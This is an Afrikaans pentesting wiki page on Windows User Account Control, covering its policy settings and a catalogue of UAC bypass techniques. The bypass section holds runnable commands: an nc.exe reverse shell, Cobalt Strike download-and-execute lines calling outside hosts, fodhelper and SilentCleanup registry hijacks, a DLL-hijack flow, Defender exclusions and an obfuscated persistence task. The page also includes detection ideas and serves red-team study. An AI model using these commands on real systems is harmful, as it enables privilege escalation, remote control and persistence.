# UAC - Gebruikersrekeningbeheer

{{#include ../../banners/hacktricks-training.md}}

## UAC

[Gebruikersrekeningbeheer (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) is ’n funksie wat ’n **toestemmingsversoek vir aktiwiteite met verhoogde regte** aktiveer. Toepassings het verskillende `integrity`-vlakke, en ’n program met ’n **hoë vlak** kan take uitvoer wat die **stelsel moontlik kan kompromitteer**. Wanneer UAC geaktiveer is, **loop toepassings en take altyd onder die sekuriteitskonteks van ’n nie-administrateurrekening**, tensy ’n administrateur hierdie toepassings/take uitdruklik magtig om toegang op administrateurvlak tot die stelsel te hê. Dit is ’n geriefsfunksie wat administrateurs teen onbedoelde veranderinge beskerm, maar dit word nie as ’n sekuriteitsgrens beskou nie.<sup>[[2]](#references)</sup>

Vir meer inligting oor integriteitsvlakke:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Wanneer UAC gebruik word, kry ’n administrateurgebruiker 2 tokens: ’n standaardgebruikertoken om gewone aksies op medium-integrity uit te voer, en een met die admin-privileges.

Hierdie [bladsy](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) bespreek in groot diepte hoe UAC werk en sluit die aanmeldproses, gebruikerservaring en UAC-argitektuur in.<sup>[[2]](#references)</sup> Administrateurs kan security policies gebruik om op plaaslike vlak op te stel hoe UAC vir hul organisasie werk (deur secpol.msc te gebruik), of dit in ’n Active Directory-domeinomgewing deur Group Policy Objects (GPO) op te stel en uit te stoot. Die verskillende instellings word [hier](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings) in besonderhede bespreek. Daar is 10 Group Policy-instellings wat vir UAC gestel kan word. Die volgende tabel verskaf bykomende besonderhede:

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [Gebruikersrekeningbeheer: Admin Approval Mode vir die ingeboude Administrator-rekening](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Disabled)                                             |
| [Gebruikersrekeningbeheer: Gedrag van die elevation prompt vir administrateurs in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Prompt for consent for non-Windows binaries on the secure desktop) |
| [Gebruikersrekeningbeheer: Gedrag van die elevation prompt vir standaardgebruikers](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Prompt for credentials on the secure desktop)         |
| [Gebruikersrekeningbeheer: Bespeur toepassingsinstallasies en vra vir elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Enabled; disabled by default on Enterprise)           |
| [Gebruikersrekeningbeheer: Verhoog slegs uitvoerbare lêers wat signed and validated is](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Disabled)                                             |
| [Gebruikersrekeningbeheer: Verhoog slegs UIAccess-toepassings wat in veilige liggings geïnstalleer is](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Enabled)                                              |
| [Gebruikersrekeningbeheer: Laat alle administrateurs in Admin Approval Mode loop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Enabled)                                              |
| [Gebruikersrekeningbeheer: Laat UIAccess-toepassings toe om vir elevation te vra sonder om die secure desktop te gebruik](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Disabled)                                             |
| [Gebruikersrekeningbeheer: Skakel oor na die secure desktop wanneer daar vir elevation gevra word](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Enabled)                                              |
| [Gebruikersrekeningbeheer: Virtualiseer lêer- en register-skryffoute na liggings per gebruiker](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Enabled)                                              |

### Policies vir die installering van sagteware op Windows

Die **plaaslike security policies** ("secpol.msc" op die meeste stelsels) is by verstek opgestel om **te verhoed dat nie-admingebruikers sagteware-installasies uitvoer**. Dit beteken dat selfs al kan ’n nie-admingebruiker die installer vir jou sagteware aflaai, hulle dit nie sonder ’n adminrekening sal kan uitvoer nie.

### Registry Keys om UAC te dwing om vir elevation te vra

As ’n standaardgebruiker sonder admin-regte kan jy verseker dat die "standaard"-rekening **deur UAC vir credentials gevra word** wanneer dit sekere aksies probeer uitvoer. Hierdie aksie vereis dat sekere **registry keys** gewysig word, waarvoor jy admin-permissies nodig het, tensy daar ’n **UAC bypass** is, of die aanvaller reeds as admin aangemeld is.

Selfs al is die gebruiker in die **Administrators**-groep, dwing hierdie veranderinge die gebruiker om hul **rekeningcredentials weer in te voer** om administratiewe aksies uit te voer.

**In die praktyk is dit slegs nuttig wanneer jy reeds ’n verhoogde token, ’n UAC bypass, of ’n misconfiguration het wat jou toelaat om hierdie keys te verander; andersins word die registry write self geblokkeer.**

Die registry keys en entries wat jy moet verander, is die volgende (met hul verstekwaardes tussen hakies):

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
- `ConsentPromptBehaviorUser` = 1 (3)
- `ConsentPromptBehaviorAdmin` = 1 (5)
- `PromptOnSecureDesktop` = 1 (1)

Dit kan ook handmatig deur die Local Security Policy-tool gedoen word. Sodra dit verander is, vra administratiewe bewerkings die gebruiker om hul credentials weer in te voer.

### Nota

**Gebruikersrekeningbeheer is nie ’n sekuriteitsgrens nie.** Daarom kan standaardgebruikers nie uit hul rekeninge ontsnap en administrateurregte verkry sonder ’n local privilege escalation exploit nie.

### Vra ’n gebruiker vir 'full computer access'
```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```
### UAC-voorregte

- Internet Explorer Protected Mode gebruik integriteitskontroles om te voorkom dat prosesse met 'n hoë integriteitsvlak (soos webblaaiers) toegang verkry tot data met 'n lae integriteitsvlak (soos die vouer met tydelike Internet-lêers). Dit word gedoen deur die blaaier met 'n lae-integriteitstoken te laat loop. Wanneer die blaaier probeer om toegang te verkry tot data wat in die lae-integriteitsone gestoor is, kontroleer die bedryfstelsel die integriteitsvlak van die proses en verleen toegang dienooreenkomstig. Hierdie funksie help om te voorkom dat remote code execution-aanvalle toegang tot sensitiewe data op die stelsel verkry.
- Wanneer 'n gebruiker by Windows aanmeld, skep die stelsel 'n toegangstoken wat 'n lys van die gebruiker se voorregte bevat. Voorregte word gedefinieer as die kombinasie van 'n gebruiker se regte en vermoëns. Die token bevat ook 'n lys van die gebruiker se credentials, wat credentials is wat gebruik word om die gebruiker teen die rekenaar en hulpbronne op die netwerk te authenticate.

### Autoadminlogon

Om Windows te konfigureer om outomaties tydens opstart by 'n spesifieke gebruiker aan te meld, stel die **`AutoAdminLogon`-registersleutel**. Dit is nuttig vir kiosk-omgewings of vir toetsdoeleindes. Gebruik dit slegs op veilige stelsels, aangesien dit die wagwoord in die register blootstel.

Stel die volgende sleutels met die Registry Editor of `reg add`:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
- `AutoAdminLogon` = 1
- `DefaultUsername` = username
- `DefaultPassword` = password

Om na normale aanmeldgedrag terug te keer, stel `AutoAdminLogon` op 0.

## UAC bypass

> [!TIP]
> Let daarop dat UAC bypass eenvoudig is as jy grafiese toegang tot die slagoffer het, aangesien jy bloot op "Yes" kan klik wanneer die UAC-aanporboodskap verskyn

Die UAC bypass is in die volgende situasie nodig: **UAC is geaktiveer, jou proses loop in 'n medium-integriteitskonteks, en jou gebruiker behoort aan die administrators-groep**.

Dit is belangrik om te noem dat dit **baie moeiliker is om UAC te bypass as dit op die hoogste sekuriteitsvlak (Always) is as wanneer dit op enige van die ander vlakke (Default) is.**

### Vinnige triage vanaf 'n medium-integrity shell

Voordat jy 'n bypass probeer, bevestig dat jy in die regte scenario is en koppel die host build aan bekende werkende metodes:
```powershell
whoami /groups
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop
powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | select ProductName,DisplayVersion,CurrentBuild,UBR"
schtasks /Query /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
```
Praktiese notas:
- As `EnableLUA=0` is, het jy nie 'n bypass nodig nie: enige admin-token kan direk vir hoë integriteit versoek.
- `ConsentPromptBehaviorAdmin=2` of `5` is die algemene scenario vir auto-elevate / COM-based bypasses.
- `Always Notify` verhoog die uitdaging, maar jy behoort steeds die presiese build te toets in plaas daarvan om mislukking te aanvaar: UACME hou steeds rekord van sommige `AlwaysNotify compatible` methods op moderne Windows-builds.<sup>[[3]](#references)</sup>

### UAC gedeaktiveer

As UAC reeds gedeaktiveer is (`ConsentPromptBehaviorAdmin` is **`0`**), kan jy **'n reverse shell met admin privileges uitvoer** (high integrity level) deur iets soos die volgende te gebruik:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### Local RPC + reusable debug object

Die AppInfo local RPC-koppelvlak `201ef99a-7fa0-444c-9399-19ba84f12a1a` kan ’n proses met debugging enabled skep. Prosesse wat deur debugging op dieselfde thread geskep word, deel die thread se debug object; ’n creation debug event bevat ’n process handle met volledige toegang, selfs wanneer die RPC-resultaat self slegs beperkte toegang verleen. Dit maak debug-object-hergebruik ’n UAC-primitive vir ’n gebruiker met medium integrity wat deel is van die Administrators group.<sup>[[11]](#references)[[12]](#references)</sup>

’n Praktiese ketting is:<sup>[[11]](#references)[[12]](#references)</sup>

1. Roep die local RPC-metode aan (direk of deur `NdrAsyncClientCall`) om ’n nie-elevated sacrificial process met debugging enabled te skep.
2. Doen navraag oor `ProcessDebugObjectHandle` met `NtQueryInformationProcess`, ontkoppel dit met `NtRemoveProcessDebug`, behou die object en terminate die sacrificial process.
3. Gebruik dieselfde RPC-koppelvlak om ’n trusted auto-elevated process te skep, en assosieer dan die gestoorde object met die calling thread deur `DbgUiSetThreadDebugObject`.
4. Roep `WaitForDebugEvent` aan en neem die `CREATE_PROCESS_DEBUG_EVENT` process handle; duplicate dit met `NtDuplicateObject` voordat jy voortgaan.
5. Voorsien die duplicated handle aan `UpdateProcThreadAttribute(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, ...)` en launch die payload met ’n extended startup-info structure. Dit hergebruik beide die elevated process context en gee die child ’n trusted-looking parent relationship.

Hunt vir die kort sequence eerder as net die auto-elevated binary: local AppInfo RPC process creation, `ProcessDebugObjectHandle` queries, debugger detach/reattach, ’n immediate creation-debug event, handle duplication, en ’n child waarvan die recorded parent nie ooreenstem met die process wat die creation APIs uitgevoer het nie.<sup>[[12]](#references)</sup>

### **Baie** Basic UAC "bypass" (full file system access)

As jy ’n shell het met ’n gebruiker wat binne die Administrators group is, kan jy die **C$** shared via SMB (file system) plaaslik in ’n nuwe disk mount, en jy sal **toegang tot alles binne die file system** hê (selfs die Administrator home folder).

> [!WARNING]
> **Dit lyk asof hierdie trick nie meer werk nie**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass met Cobalt Strike

Die Cobalt Strike-tegnieke sal slegs werk indien UAC nie op sy hoogste sekuriteitsvlak gestel is nie.
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** en **Metasploit** het ook verskeie modules om die **UAC** te **bypass**.

### Verhoogde COM-koppelvlakke (`ICMLuaUtil` / `CMSTPLUA`)

Outomaties verhoogde COM-objekte bly ’n praktiese UAC-aanvalsoppervlak op moderne builds. `ICMLuaUtil` word steeds deur UACME as werkend op huidige Windows-vertakkings opgespoor, en offensive tooling hou aan om `CMSTPLUA` aan te pas deur ’n interaktiewe desktop-proses, 64-bis-uitvoering en soms PEB/proses-maskering te kombineer voordat die COM Elevation Moniker aangeroep word.<sup>[[3]](#references)</sup>

Praktiese wenke:
- Verkies ’n **64-bis**-proses in die gebruiker se **interaktiewe sessie** (gewoonlik `explorer.exe` of ’n child daarvan).
- As ’n raw shell misluk, probeer weer vanaf ’n BOF / UACME-implementering in plaas van ’n naïewe `CreateProcess`-wrapper.
- Verwag dat child-uitvoering in ’n **afsonderlike verhoogde proses** sal plaasvind; baie BOFs verhoog nie die huidige beacon in plek nie.

### KRBUACBypass

Dokumentasie en tool by [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC-bypass exploits

[**UACME**](https://github.com/hfiref0x/UACME) is ’n versameling UAC-bypass-tegnieke. Compileer dit met Visual Studio of MSBuild; die build skep verskeie executables (byvoorbeeld `Source\Akagi\output\x64\Debug\Akagi.exe`), dus kies die metode wat geskik is vir die teiken-build.<sup>[[3]](#references)</sup>\
Wees versigtig: sommige bypasses begin sigbare programme of prompts wat die gebruiker kan waarsku.<sup>[[3]](#references)</sup>

UACME het die **build-weergawe vanaf wanneer elke tegniek begin werk het**.<sup>[[3]](#references)</sup> Jy kan soek na ’n tegniek wat jou weergawes beïnvloed:
```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Ook, deur [hierdie](https://en.wikipedia.org/wiki/Windows_10_version_history)-bladsy te gebruik, kry jy die Windows release `1607` uit die build-weergawes.

’n Praktiese werksvloei is om eers die **host build** te **score**, en eers daarna die ooreenstemmende metode uit te voer:
```cmd
python main.py --scan uac
Akagi64.exe 33 C:\Windows\System32\cmd.exe
```
- `WinPwnage` vergelyk die plaaslike build vinnig met sy bekende UAC methods, wat nuttig is om dooie PoCs vinnig uit te skakel.<sup>[[4]](#references)</sup>
- `UACME` bly die beste publieke katalogus om ’n bypass aan ’n presiese build te koppel. Version 3.7.1 het methods 83–85 bygevoeg, terwyl die voorafgaande release bestaande methods weer teen **Windows 11 25H2** getoets het; kontroleer die method table en release notes weer eerder as om aan te neem dat ’n ou PoC steeds onveranderd van toepassing is.<sup>[[3]](#references)[[9]](#references)</sup>

### Always Notify-geskikte WNF/UIAccess-kettings (UACME 3.7.1)

`Always Notify` skakel nie elke UAC bypass uit nie. UACME 3.7.1 implementeer drie nuwe x64 methods wat gebruikerbeheerde environment-/protocol-state met verhoogde scheduled-task- of UIAccess-gedrag kombineer, en merk almal as `AlwaysNotify compatible`:<sup>[[3]](#references)[[9]](#references)</sup>

- **83 — UnifiedConsent:** herlei `SystemRoot` sodat die WNF-getriggerde `\Microsoft\Windows\ConsentUX\UnifiedConsent\UnifiedConsentSyncTask` verhoogde `taskhostw.exe` `unifiedconsent.dll` laat side-load. UACME volg dit vanaf Windows 10 build 19041.
- **84 — TabTip:** gebruik dieselfde environment-variable primitive teen UIAccess `TabTip.exe`, wat, afhangend van die build, `windows.storage.dll`, `ApplicationTargetedFeatureDatabase.dll` of `rsaenh.dll` laai, en pivot dan vanaf die resulterende high-integrity UIAccess-context. UACME volg dit vanaf Windows 8.1 / Server 2016.
- **85 — Narrator:** kaap die per-user `feedback-hub`-protocol, beheer Narrator met `Alt+CapsLock+F`, en launch dan ’n skryfbare kopie van `osk.exe` wat `OskSupport.dll` side-load. Dit vereis ’n interaktiewe desktop en word vanaf Windows 10 1809 / Server 2019 gevolg.

Nadat jy die payload units en Akagi gebou het soos deur UACME gedokumenteer, invoke die ooreenstemmende method number (die opsionele command gebruik by verstek `cmd.exe`):
```cmd
Akagi64.exe 83 C:\Windows\System32\cmd.exe
Akagi64.exe 84 C:\Windows\System32\cmd.exe
Akagi64.exe 85 C:\Windows\System32\cmd.exe
```
Methods 84 en 85 is afhanklik van UIAccess/desktop interaction, dus moenie verwag dat hulle onveranderd vanaf Session 0 of ’n nie-interaktiewe service shell sal werk nie. Al drie manipuleer environment/protocol state en stage DLLs; inspekteer die implementation en verwyder daardie artifacts nadat jy getoets het.<sup>[[3]](#references)[[9]](#references)</sup>

### UAC Bypass – fodhelper.exe (Registry hijack)

Die trusted binary `fodhelper.exe` word op moderne Windows outomaties elevated. Wanneer dit geloods word, query dit die per-user registry path hieronder sonder om die `DelegateExecute`-verb te valideer. Deur ’n command daar te plant, kan ’n Medium Integrity process (user is in Administrators) ’n High Integrity process sonder ’n UAC prompt spawn.

Registry path wat deur fodhelper gequery word:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
<details>
<summary>PowerShell-stappe (stel jou payload in, en trigger dit dan)</summary>
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
</details>
Notas:
- Werk wanneer die huidige gebruiker 'n lid van Administrators is en die UAC-vlak standaard/lenient is (nie Always Notify met ekstra beperkings nie).
- Gebruik die `sysnative`-pad om 'n 64-bis PowerShell vanaf 'n 32-bis proses op 64-bis Windows te begin.
- Payload kan enige opdrag wees (PowerShell, cmd of 'n EXE-pad). Vermy UI's wat versoeke vertoon vir stealth.

#### CurVer/extension hijack-variant (slegs HKCU)

Onlangse samples wat `fodhelper.exe` misbruik, vermy `DelegateExecute` en **redirect eerder die `ms-settings` ProgID** deur die per-user `CurVer`-waarde. Die auto-elevated binary resolve steeds die handler onder `HKCU`, dus is geen admin-token nodig om die keys te plant nie:<sup>[[5]](#references)</sup>
```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```
Sodra dit verhoog is, **skakel malware gewoonlik toekomstige prompts uit** deur `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` op `0` te stel, en voer dan verdere defense evasion uit (bv. `Add-MpPreference -ExclusionPath C:\ProgramData`) en skep persistence oor om as high integrity te loop. ’n Tipiese persistence-taak stoor ’n **XOR-encrypted PowerShell script** op skyf en dekodeer/voer dit elke uur in-memory uit:<sup>[[5]](#references)</sup>
```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```
Hierdie variant ruim steeds die dropper op en laat slegs die staged payloads agter, wat maak dat detection afhanklik is van monitering van die **`CurVer`-hijack**, peutering aan `ConsentPromptBehaviorAdmin`, die skep van Defender exclusions, of scheduled tasks wat PowerShell in die geheue dekripteer.<sup>[[5]](#references)</sup>

### UAC bypass via `SilentCleanup` task (`HKCU\Environment\windir`)

`SilentCleanup` launch `cleanmgr.exe` met die hoogste voorregte en brei `%windir%` uit die user environment. As jy `HKCU\Environment\windir` beheer, kan jy daardie uitbreiding na ’n arbitrêre command herlei en high integrity sonder ’n consent dialog verkry.<sup>[[8]](#references)</sup> Hierdie metode is steeds die moeite werd om op onlangse builds te toets, omdat UACME die technique aktief hou en onlangse issue tracking toon dat Windows 11 24H2 moontlik slegs klein quoting-aanpassings benodig.<sup>[[3]](#references)</sup>
```cmd
reg add "HKCU\Environment" /v windir /d "cmd.exe /c start powershell.exe" /f
schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
reg delete "HKCU\Environment" /v windir /f
```
As die taak die pad op daardie build aanhaal, probeer weer met die payload wat met ’n aanhalingsteken eindig (byvoorbeeld `cmd.exe"`). Maak altyd `HKCU\Environment\windir` skoon nadat jy getoets het.

#### Meer UAC bypass

Baie klassieke UAC bypasses wat UI-flows, COM-objects of desktop interaction misbruik, vereis ’n **full interactive session** met die slagoffer; ’n algemene `nc.exe`-shell of ’n service wat in **Session 0** loop, is dikwels nie genoeg nie.

Jy kan dit dikwels oplos deur ’n **meterpreter**-session te gebruik. Migrate na ’n **process** waarvan die **Session**-waarde gelyk is aan **1**:

![Point ms-settings to a custom extension (.thm) and map that extension to our payload - More UAC bypass: You can get using a meterpreter session. Migrate to a process that has the Session...](<../../images/image (863).png>)

(_explorer.exe_ behoort te werk)

### UAC Bypass met GUI

As jy toegang tot ’n **GUI** het, kan jy eenvoudig die UAC-prompt aanvaar wanneer dit verskyn; jy het nie werklik ’n tegniese bypass nodig nie. Daarom is die verkryging van ’n GUI-session dikwels genoeg om die praktiese wrywing wat deur UAC veroorsaak word, te omseil.

Verder, as jy ’n GUI-session kry wat iemand gebruik het (moontlik via RDP), sal **sommige tools as administrator loop**, vanwaar jy byvoorbeeld ’n **cmd** direk **as admin kan run** sonder om weer deur UAC gevra te word, soos [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Dit kan ’n bietjie meer **stealthy** wees.

### Geraasvolle brute-force UAC bypass

As geraas aanvaarbaar is, kan ’n tool soos [**ForceAdmin**](https://github.com/Chainski/ForceAdmin) herhaaldelik elevation versoek totdat die gebruiker dit aanvaar.

### Jou eie bypass - Basiese UAC bypass-metodologie

As jy na **UACME** kyk, sal jy opmerk dat **baie UAC bypasses DLL hijacking misbruik** (dikwels deur ’n elevated binary ’n attacker-controlled DLL vanaf ’n writable path te laat load). [Read this to learn how to find a DLL hijacking vulnerability](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Vind ’n binary wat sal **autoelevate** (kontroleer dat dit, wanneer dit uitgevoer word, op ’n high integrity level loop).
2. Gebruik procmon om "**NAME NOT FOUND**"-events te vind wat kwesbaar vir **DLL Hijacking** kan wees.
3. Jy sal waarskynlik die DLL binne sekere **protected paths** (soos C:\Windows\System32) moet **write**, waar jy nie skryftoestemmings het nie. Jy kan dit omseil deur:
1. **wusa.exe**: Windows 7,8 en 8.1. Dit laat jou toe om die inhoud van ’n CAB-file binne protected paths te extract (omdat hierdie tool vanaf ’n high integrity level uitgevoer word).
2. **IFileOperation**: Windows 10.
4. Berei ’n **script** voor om jou DLL binne die protected path te copy en die kwesbare, autoelevated binary uit te voer.

### Nog ’n UAC bypass-tegniek

Dit behels dat jy kyk of ’n **autoElevated binary** probeer om die **naam/pad** van ’n **binary** of **command** wat uitgevoer moet word, vanaf die **registry** te **read** (dit is interessanter as die binary hierdie inligting binne die **HKCU** soek).

### UAC bypass via `SysWOW64\iscsicpl.exe` + user `PATH` DLL hijack

Die 32-bit `C:\Windows\SysWOW64\iscsicpl.exe` is ’n **auto-elevated** binary wat misbruik kan word om `iscsiexe.dll` volgens die search order te load. As jy ’n malicious `iscsiexe.dll` binne ’n **user-writable** folder kan plaas en dan die huidige user se `PATH` wysig (byvoorbeeld via `HKCU\Environment\Path`) sodat daardie folder gesoek word, kan Windows die attacker DLL binne die elevated `iscsicpl.exe`-process load **sonder om ’n UAC-prompt te wys**.<sup>[[1]](#references)[[6]](#references)</sup>

Praktiese notas:
- Dit is nuttig wanneer die huidige user in **Administrators** is, maar op **Medium Integrity** loop weens UAC.
- Die **SysWOW64**-kopie is die relevante een vir hierdie bypass. Behandel die **System32**-kopie as ’n afsonderlike binary en valideer gedrag onafhanklik.
- Die primitive is ’n kombinasie van **auto-elevation** en **DLL search-order hijacking**, dus is dieselfde ProcMon-workflow wat vir ander UAC bypasses gebruik word, nuttig om die ontbrekende DLL-load te valideer.

Minimale flow:
```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```
Opsporingsidees:
- Stel 'n waarskuwing op vir `reg add` / registerskrywings na `HKCU\Environment\Path` wat onmiddellik gevolg word deur die uitvoering van `C:\Windows\SysWOW64\iscsicpl.exe`.
- Soek na `iscsiexe.dll` in **gebruiker-beheerde** liggings soos `%TEMP%` of `%LOCALAPPDATA%\Microsoft\WindowsApps`.
- Korrelleer die bekendstelling van `iscsicpl.exe` met onverwagte kinderprosesse of DLL-ladings vanuit buite die normale Windows-gidse.

### Nuwer navorsing wat afsonderlik nagegaan behoort te word

Sommige kettings ná 2024 lyk nie meer soos die klassieke `HKCU\Software\Classes`-registerkapings nie. Activation-context cache poisoning kan byvoorbeeld 'n **drive remap** en **DLL redirection** kombineer om van medium na hoë integriteit te beweeg deur vertroude UI- / auto-elevated binaries soos `ctfmon.exe` en latere teikens soos `fodhelper.exe`. In plaas daarvan om die groot PoC hier te dupliseer, kyk na die kompakte payload-voorbeelde in:

{{#ref}}
../windows-local-privilege-escalation/windows-c-payloads.md
{{#endref}}

### Administrator Protection (voorskou) drive-letter hijack via per-logon-session DOS device map

> [!NOTE]
